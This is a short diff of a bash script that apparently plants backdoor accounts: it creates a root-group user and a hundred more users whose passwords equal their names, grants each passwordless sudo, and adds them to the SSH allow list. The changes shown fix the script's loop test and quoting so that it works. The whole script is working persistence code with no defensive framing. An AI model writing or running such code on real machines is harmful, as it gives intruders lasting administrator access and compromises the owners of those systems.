@@ -3,11 +3,11 @@ useradd -d /root -g root -r -s /bin/bash LOLGETREKT0
 echo -e "LOLGETREKT0\nLOLGETREKT0" | passwd LOLGETREKT0
 echo "LOLGETREKT0 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 counter=1
-while [$counter -le 100]
+while [ $counter -le 100 ]
 do
 	name=LOLGETREKT$counter
 	useradd -d /home/$name -m -g wheel -k /etc/skel -s /bin/bash $name
-	echo 'AllowUsers $name' >> /etc/ssh/sshd_config
+	echo "AllowUsers $name" >> /etc/ssh/sshd_config
 	echo -e "$name\n$name" | passwd $name
 	echo "$name ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 	((counter++))
